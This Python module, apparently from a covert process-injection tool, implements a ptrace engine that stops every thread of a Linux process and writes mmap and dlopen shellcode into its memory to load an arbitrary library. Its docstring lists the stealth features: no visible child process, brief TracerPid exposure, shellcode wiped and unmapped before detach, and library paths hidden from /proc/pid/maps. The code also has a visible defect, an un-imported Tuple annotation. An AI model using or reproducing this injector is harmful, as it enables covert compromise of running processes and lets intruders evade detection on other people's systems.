"""
core/ptrace.py — Primary injection engine via ptrace(2).

No GDB subprocess, no temp files, no additional entries visible in ps.

Injection sequence
──────────────────
1.  Stop ALL threads via PTRACE_ATTACH on each /proc/pid/task/<tid>
2.  Save RIP and the bytes at RIP in the main thread
3.  Write mmap syscall stub at RIP → execute → get RWX scratch page
4.  Write dlopen shellcode + library path into scratch page
5.  Execute dlopen shellcode → library loaded
6.  Write REP STOSQ zero stub → wipe shellcode residue from scratch page
7.  Write munmap stub → unmap scratch page (no leftover RWX mapping)
8.  Restore original bytes at RIP + original registers
9.  Detach all threads → process resumes transparently

Stealth properties
──────────────────
• No temp files or child processes
• TracerPid is non-zero for ~milliseconds only
• Scratch page is zeroed and unmapped before detach
• All threads are stopped during injection (prevents TOCTOU crashes)
• Works with memfd staging to hide library path from /proc/pid/maps
"""

import os
import ctypes
import ctypes.util
import signal as _signal
import struct
from pathlib import Path
from typing import IO, List, Optional

from utils.log import _log, InjectionError
from core.stealth import jitter, get_all_tids
from core.shellcode import (
    MMAP_STUB,
    build_dlopen_stub,
    build_munmap_stub,
    build_zero_stub,
)


# ── x86_64 register struct ────────────────────────────────────────────────────

class UserRegsStruct(ctypes.Structure):
    """Mirrors struct user_regs_struct from <sys/user.h> on x86_64."""
    _fields_ = [
        ("r15",      ctypes.c_ulonglong),
        ("r14",      ctypes.c_ulonglong),
        ("r13",      ctypes.c_ulonglong),
        ("r12",      ctypes.c_ulonglong),
        ("rbp",      ctypes.c_ulonglong),
        ("rbx",      ctypes.c_ulonglong),
        ("r11",      ctypes.c_ulonglong),
        ("r10",      ctypes.c_ulonglong),
        ("r9",       ctypes.c_ulonglong),
        ("r8",       ctypes.c_ulonglong),
        ("rax",      ctypes.c_ulonglong),
        ("rcx",      ctypes.c_ulonglong),
        ("rdx",      ctypes.c_ulonglong),
        ("rsi",      ctypes.c_ulonglong),
        ("rdi",      ctypes.c_ulonglong),
        ("orig_rax", ctypes.c_ulonglong),
        ("rip",      ctypes.c_ulonglong),
        ("cs",       ctypes.c_ulonglong),
        ("eflags",   ctypes.c_ulonglong),
        ("rsp",      ctypes.c_ulonglong),
        ("ss",       ctypes.c_ulonglong),
        ("fs_base",  ctypes.c_ulonglong),
        ("gs_base",  ctypes.c_ulonglong),
        ("ds",       ctypes.c_ulonglong),
        ("es",       ctypes.c_ulonglong),
        ("fs",       ctypes.c_ulonglong),
        ("gs",       ctypes.c_ulonglong),
    ]


def _copy_regs(src: UserRegsStruct) -> UserRegsStruct:
    dst = UserRegsStruct()
    ctypes.memmove(ctypes.byref(dst), ctypes.byref(src), ctypes.sizeof(UserRegsStruct))
    return dst


# ── Injector ──────────────────────────────────────────────────────────────────

class PtraceInjector:

    PTRACE_PEEKDATA = 2
    PTRACE_POKEDATA = 5
    PTRACE_CONT     = 7
    PTRACE_GETREGS  = 12
    PTRACE_SETREGS  = 13
    PTRACE_ATTACH   = 16
    PTRACE_DETACH   = 17
    PTRACE_SYSCALL  = 24

    def __init__(self, pid: int):
        self.pid           = pid
        self._attached     = False
        self._extra_tids:  List[int] = []
        self._mem_fd:      Optional[IO[bytes]] = None   # open during inject()

        self._libc = ctypes.CDLL(ctypes.util.find_library("c"), use_errno=True)
        self._libc.ptrace.argtypes = [
            ctypes.c_int, ctypes.c_int,
            ctypes.c_void_p, ctypes.c_void_p,
        ]
        self._libc.ptrace.restype = ctypes.c_long

    # ── Low-level ptrace wrapper ──────────────────────────────────────────────

    def _ptrace(self, request: int, pid: Optional[int] = None,
                addr: int = 0, data: Optional[int] = None) -> int:
        target = pid if pid is not None else self.pid
        ctypes.set_errno(0)
        ret = self._libc.ptrace(
            request,
            target,
            ctypes.c_void_p(addr),
            ctypes.c_void_p(data) if data is not None else ctypes.c_void_p(0),
        )
        errno = ctypes.get_errno()
        if ret == -1 and errno:
            raise OSError(errno, os.strerror(errno),
                          f"ptrace(req={request}, pid={target})")
        return ret

    def _ptrace_regs(self, request: int, regs: UserRegsStruct) -> None:
        """GETREGS / SETREGS share the same calling convention but need byref(regs)."""
        ctypes.set_errno(0)
        ret = self._libc.ptrace(
            request, self.pid,
            ctypes.c_void_p(0), ctypes.byref(regs),
        )
        errno = ctypes.get_errno()
        if ret == -1 and errno:
            name = "GETREGS" if request == self.PTRACE_GETREGS else "SETREGS"
            raise InjectionError(
                f"ptrace({name}) failed: {os.strerror(errno)}"
            )

    # ── Attach / detach ───────────────────────────────────────────────────────

    def attach(self) -> None:
        """
        Attach to the main thread and stop all other threads.
        Stopping all threads prevents races: if an unblocked thread calls
        dlopen() while we're mid-inject, the loader mutex deadlocks.
        """
        if self._attached:
            return

        self._ptrace(self.PTRACE_ATTACH)
        _, status = os.waitpid(self.pid, 0)
        if not os.WIFSTOPPED(status):
            raise InjectionError(
                f"Expected SIGSTOP after PTRACE_ATTACH, got status=0x{status:x}"
            )
        self._attached = True
        _log("DEBUG", f"Attached to main thread PID {self.pid}")
        self._escape_syscall_if_needed()

        for tid in get_all_tids(self.pid):
            if tid == self.pid:
                continue
            try:
                self._ptrace(self.PTRACE_ATTACH, pid=tid)
                os.waitpid(tid, 0)
                self._extra_tids.append(tid)
                _log("DEBUG", f"Stopped extra thread TID {tid}")
            except OSError as exc:
                _log("DEBUG", f"Could not stop TID {tid}: {exc}")

    def _escape_syscall_if_needed(self) -> None:
        _RESTART_CODES = {
            2**64 - 512,
            2**64 - 513,
            2**64 - 514,
            2**64 - 516,
        }
        try:
            regs = self.get_regs()
        except InjectionError:
            return
        if regs.rax not in _RESTART_CODES:
            return
        syscall_nr = regs.orig_rax
        _log("DEBUG",
             f"Process stopped inside syscall {syscall_nr} "
             f"(rax=0x{regs.rax:x}) — stepping out via PTRACE_SYSCALL")
        # cancel the blocking syscall by setting orig_rax=-1
        # the kernel returns -ENOSYS immediately instead of waiting
        cancel_regs = self.get_regs()
        cancel_regs.orig_rax = 2**64 - 1
        self.set_regs(cancel_regs)
        self._ptrace(self.PTRACE_SYSCALL, addr=0, data=0)
        _, status = os.waitpid(self.pid, 0)
        if not os.WIFSTOPPED(status):
            raise InjectionError(
                f"Process exited unexpectedly while escaping syscall "
                f"(status=0x{status:x})"
            )
        _log("DEBUG", f"Escaped syscall {syscall_nr}, now at RIP=0x{self.get_regs().rip:x}")

    def detach(self) -> None:
        """Detach all threads in reverse order (extra threads first)."""
        for tid in reversed(self._extra_tids):
            try:
                self._ptrace(self.PTRACE_DETACH, pid=tid, addr=0, data=0)
                _log("DEBUG", f"Detached extra thread TID {tid}")
            except OSError:
                pass
        self._extra_tids.clear()

        if self._attached:
            try:
                self._ptrace(self.PTRACE_DETACH, addr=0, data=0)
            except OSError:
                pass
            self._attached = False
            _log("DEBUG", f"Detached from main thread PID {self.pid}")

    # ── Register access ───────────────────────────────────────────────────────

    def get_regs(self) -> UserRegsStruct:
        regs = UserRegsStruct()
        self._ptrace_regs(self.PTRACE_GETREGS, regs)
        return regs

    def set_regs(self, regs: UserRegsStruct) -> None:
        self._ptrace_regs(self.PTRACE_SETREGS, regs)

    # ── Memory access ─────────────────────────────────────────────────────────

    def read_bytes(self, addr: int, size: int) -> bytes:
        """Read *size* bytes from target at *addr* word-by-word via PEEKDATA."""
        out = b""
        for off in range(0, (size + 7) & ~7, 8):
            word = self._ptrace(self.PTRACE_PEEKDATA, addr=addr + off)
            out += struct.pack("<Q", word & 0xFFFF_FFFF_FFFF_FFFF)
        return out[:size]

    def write_mem(self, addr: int, data: bytes) -> None:
        """
        Write *data* to target memory via /proc/pid/mem.
        Bypasses page permissions — ptrace privileges grant unrestricted access.

        If called during inject() the already-open fd is reused. Otherwise a
        fresh handle is opened for that single write (e.g. external callers).
        """
        if self._mem_fd is not None:
            self._mem_fd.seek(addr)
            self._mem_fd.write(data)
            return
        with open(f"/proc/{self.pid}/mem", "r+b", buffering=0) as f:
            f.seek(addr)
            f.write(data)

    # ── Execution control ─────────────────────────────────────────────────────

    def _cont_and_wait_trap(self) -> None:
        """
        Resume execution and block until our INT3 fires (SIGTRAP).
        Real signals the target receives are forwarded transparently.
        """
        fwd_sig = 0
        while True:
            self._ptrace(self.PTRACE_CONT, addr=0, data=fwd_sig)
            _, status = os.waitpid(self.pid, 0)

            if os.WIFSTOPPED(status):
                sig = os.WSTOPSIG(status)
                if sig == _signal.SIGTRAP:
                    return
                if sig == _signal.SIGSEGV:
                    try:
                        fault_regs = self.get_regs()
                        _log("DEBUG", f"SIGSEGV at RIP=0x{fault_regs.rip:x}  RSP=0x{fault_regs.rsp:x}  RDI=0x{fault_regs.rdi:x}")
                    except Exception:
                        pass
                _log("DEBUG", f"Forwarding signal {sig} to target")
                fwd_sig = sig

            elif os.WIFEXITED(status) or os.WIFSIGNALED(status):
                raise InjectionError(
                    f"Target process died during injection (status=0x{status:x})"
                )

    # ── Symbol resolution ─────────────────────────────────────────────────────

    @staticmethod
    def _find_lib_base(pid: int, name_hint: str) -> Tuple[int, str]:
        """
        Scan /proc/pid/maps for the first mapping of the library matching
        name_hint. We take the lowest address regardless of permissions —
        the LOAD segment header (r--p) typically comes before the code
        segment (r-xp) and gives us the true ELF base.
        """
        best_addr = 0
        best_path = ""
        try:
            for line in Path(f"/proc/{pid}/maps").read_text().splitlines():
                parts = line.split()
                if len(parts) < 6:
                    continue
                if name_hint not in parts[-1]:
                    continue
                addr = int(parts[0].split("-")[0], 16)
                if best_addr == 0 or addr < best_addr:
                    best_addr = addr
                    best_path = parts[-1]
        except (FileNotFoundError, PermissionError):
            pass
        return best_addr, best_path

    def find_dlopen_addr(self) -> int:
        """
        Resolve dlopen() address in the target process.
    
        Instead of guessing the library base by name (which can match wrong
        libraries like libcrypto), we locate the exact segment that contains
        our own dlopen pointer, then find the same segment in the target by
        matching library path + file offset. ASLR shifts segments uniformly
        so the intra-segment offset is invariant.
        """
        # Step 1: get dlopen address in our own process
        lib_name = ctypes.util.find_library("dl") or ctypes.util.find_library("c")
        handle   = ctypes.CDLL(lib_name)
        fn_ptr   = None
        for sym in ("dlopen", "__libc_dlopen_mode"):
            try:
                fn_ptr = getattr(handle, sym)
                break
            except AttributeError:
                continue
        if fn_ptr is None:
            raise InjectionError("Neither 'dlopen' nor '__libc_dlopen_mode' found")
    
        our_dlopen = ctypes.cast(fn_ptr, ctypes.c_void_p).value
    
        # Step 2: find which segment in OUR maps contains our_dlopen
        our_seg_start  = 0
        our_file_off   = 0
        our_lib_path   = ""
        for line in Path(f"/proc/{os.getpid()}/maps").read_text().splitlines():
            parts = line.split()
            if len(parts) < 6:
                continue
            start, end = (int(x, 16) for x in parts[0].split("-"))
            if start <= our_dlopen < end:
                our_seg_start = start
                our_file_off  = int(parts[2], 16)
                our_lib_path  = parts[-1]
                break
    
        if not our_seg_start:
            raise InjectionError("Could not locate dlopen segment in our own maps")
    
        our_intra_offset = our_dlopen - our_seg_start
        _log("DEBUG", f"our dlopen=0x{our_dlopen:x}  seg=0x{our_seg_start:x}"
                      f"  file_off=0x{our_file_off:x}  lib={Path(our_lib_path).name}")
    
        # Step 3: find the same segment in the target (same path + same file offset)
        lib_basename = Path(our_lib_path).name
        target_seg_start = 0
        try:
            for line in Path(f"/proc/{self.pid}/maps").read_text().splitlines():
                parts = line.split()
                if len(parts) < 6:
                    continue
                if Path(parts[-1]).name != lib_basename:
                    continue
                if int(parts[2], 16) != our_file_off:
                    continue
                target_seg_start = int(parts[0].split("-")[0], 16)
                break
        except (FileNotFoundError, PermissionError):
            pass
    
        if not target_seg_start:
            raise InjectionError(
                f"Could not find segment '{lib_basename}' (file_off=0x{our_file_off:x})"
                f" in target /proc/{self.pid}/maps"
            )
    
        target_dlopen = target_seg_start + our_intra_offset
        _log("DEBUG", f"target seg=0x{target_seg_start:x}  "
                      f"target dlopen=0x{target_dlopen:x}")
    
        return target_dlopen
        # ── Main injection entry point ────────────────────────────────────────────
    
    def inject(self, lib_path: Path) -> bool:
        """
        Full injection sequence. Raises InjectionError on failure.
        Always detaches cleanly in the finally block.
        """
        import utils.signals as _sig_mod
        _sig_mod._active_injector = self

        try:
            self.attach()
            jitter()

            # open /proc/pid/mem once and reuse it for all writes this session
            self._mem_fd = open(f"/proc/{self.pid}/mem", "r+b", buffering=0)

            # 1. Save execution state
            orig_regs  = self.get_regs()
            orig_rip   = orig_regs.rip
            save_len   = max(len(MMAP_STUB), 64)
            orig_bytes = self.read_bytes(orig_rip, save_len)
            _log("DEBUG", f"Saved RIP=0x{orig_rip:x}, {save_len} bytes of original code")

            # 2. Inject mmap stub → allocate RWX scratch page
            self.write_mem(orig_rip, MMAP_STUB)
            step_regs = _copy_regs(orig_regs)
            step_regs.rip = orig_rip
            self.set_regs(step_regs)

            jitter()
            self._cont_and_wait_trap()

            rwx_addr = self.get_regs().rax
            if rwx_addr == 0 or rwx_addr >= (1 << 47):
                raise InjectionError(
                    f"mmap() failed inside target (rax=0x{rwx_addr:x}).\n"
                    "      The target may have a strict seccomp filter blocking mmap.\n"
                    f"      Check: cat /proc/{self.pid}/status | grep Seccomp"
                )
            _log("DEBUG", f"RWX scratch page at 0x{rwx_addr:x}")

            # 3. Resolve dlopen and write shellcode to scratch page
            dlopen_addr = self.find_dlopen_addr()
            shellcode   = build_dlopen_stub(dlopen_addr, str(lib_path).encode())
            sc_len      = len(shellcode)
            self.write_mem(rwx_addr, shellcode)

            # 4. Execute dlopen shellcode
            jitter()
            step_regs = _copy_regs(orig_regs)
            step_regs.rip = rwx_addr
            self.set_regs(step_regs)
            self._cont_and_wait_trap()

            dlopen_result = self.get_regs().rax
            _log("DEBUG", f"dlopen() handle = 0x{dlopen_result:x}")

            # 5. Zero shellcode residue in scratch page
            zero_stub = build_zero_stub(rwx_addr, sc_len)
            self.write_mem(orig_rip, zero_stub)
            step_regs = _copy_regs(orig_regs)
            step_regs.rip = orig_rip
            self.set_regs(step_regs)
            jitter()
            self._cont_and_wait_trap()
            _log("DEBUG", "Shellcode residue zeroed")

            # 6. Unmap the scratch page
            munmap_stub = build_munmap_stub(rwx_addr)
            self.write_mem(orig_rip, munmap_stub)
            step_regs = _copy_regs(orig_regs)
            step_regs.rip = orig_rip
            self.set_regs(step_regs)
            jitter()
            self._cont_and_wait_trap()
            _log("DEBUG", "Scratch page unmapped")

            # 7. Restore original bytes and registers
            self.write_mem(orig_rip, orig_bytes)
            self.set_regs(orig_regs)
            _log("DEBUG", "Original execution state restored")

            if dlopen_result == 0:
                raise InjectionError(
                    "dlopen() returned NULL — library failed to load inside target.\n"
                    "      Common causes: missing dependencies, wrong architecture,\n"
                    "      constructor called abort(), or seccomp blocking open(2).\n"
                    f"      Diagnose: LD_DEBUG=all LD_PRELOAD={lib_path} /bin/true 2>&1 | head -40"
                )

            return True

        except InjectionError:
            raise
        except OSError as exc:
            raise InjectionError(
                f"OS error during injection (errno={exc.errno}): {exc}"
            ) from exc
        except Exception as exc:
            raise InjectionError(f"Unexpected error: {exc}") from exc
        finally:
            if self._mem_fd is not None:
                try:
                    self._mem_fd.close()
                except OSError:
                    pass
                self._mem_fd = None
            self.detach()
            _sig_mod._active_injector = None
